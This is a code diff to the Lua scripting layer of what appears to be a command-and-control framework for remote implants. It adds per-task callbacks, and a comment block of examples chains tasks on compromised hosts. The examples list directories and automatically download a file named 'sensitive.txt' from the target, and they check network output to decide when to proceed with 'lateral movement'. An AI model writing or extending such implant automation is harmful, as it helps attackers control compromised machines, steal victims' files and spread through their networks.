@@ -12,11 +12,17 @@ CODE = {
 }
 
 function ping(payload)
-    print("command ping from script args", payload)
-    local err = add_task(CODE.PING, payload)
-    if err then
-        print("Error")
-    end
+    lua_print("command ping from script args", payload, "\n")
+    local task_id = add_task(CODE.PING, payload)
+    
+    -- Register a callback for this specific task
+    register_task_callback(task_id, function(task_id, response, name, uuid, hostname, user)
+        lua_print("=== PING Response ===\n")
+        lua_print("Task ID: " .. task_id.."\n")
+        lua_print("Response: " .. response .. "\n")
+        lua_print("From: " .. hostname .. " (" .. name .. ")\n")
+        -- You can add automation logic here
+    end)
 end
 
 function ssh(payload)
@@ -188,6 +194,52 @@ function OnResponse(...)
     print("response:", args[5])
     print("task:", args[6])
 end
+]]
+
+--[[ TASK-SPECIFIC CALLBACKS EXAMPLE
+
+Task-specific callbacks allow you to register handlers for individual tasks,
+enabling automation workflows. The callback is called when the task response
+is received and is automatically removed after execution.
+
+Example 1: Simple task callback
+    local task_id = add_task(CODE.PWD, "")
+    register_task_callback(task_id, function(task_id, response, name, uuid, hostname, user)
+        lua_print("Current directory: " .. response)
+    end)
+
+Example 2: Chain tasks based on response
+    local task_id = add_task(CODE.LS, "/tmp")
+    register_task_callback(task_id, function(task_id, response, name, uuid, hostname, user)
+        if string.match(response, "sensitive.txt") then
+            lua_print("Found sensitive file, downloading...")
+            add_task(CODE.DOWN, "/tmp/sensitive.txt")
+        end
+    end)
+
+Example 3: Conditional automation
+    local task_id = add_task(CODE.IFCONFIG, "")
+    register_task_callback(task_id, function(task_id, response, name, uuid, hostname, user)
+        if string.match(response, "192.168") then
+            lua_print(hostname .. " is on local network, proceeding with lateral movement")
+            -- Add more tasks for lateral movement
+        end
+    end)
+
+Callback parameters:
+    - task_id: The unique task identifier
+    - response: The task response data
+    - name: Implant session name
+    - uuid: Implant UUID
+    - hostname: Target hostname  
+    - user: Current user on target
+
+Note: Task-specific callbacks take precedence over the global OnResponse callback.
+      The callback is removed after execution (one-time use).
+
+Thread-safe printing:
+    Use lua_print() instead of print() in callbacks for thread-safe output.
+    lua_print() uses the AsyncWriteStdout function from the log package.
 ]]
 
 function Main()
